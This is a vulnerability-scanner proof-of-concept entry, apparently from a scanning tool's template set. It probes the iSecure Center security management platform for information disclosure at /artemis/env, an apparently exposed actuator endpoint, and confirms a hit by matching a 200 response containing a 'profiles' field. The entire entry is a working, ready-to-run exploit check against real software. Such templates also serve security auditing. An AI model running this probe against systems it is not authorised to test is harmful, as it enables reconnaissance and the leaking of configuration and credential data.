{
        'name': '综合安防管理平台 iSecure Center /artemis/env 信息泄露',
        'poc':[{'requests':{
            'method': 'get',
            'payload': '/artemis/env',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': '"profiles":["prod"],'
        }}]
    }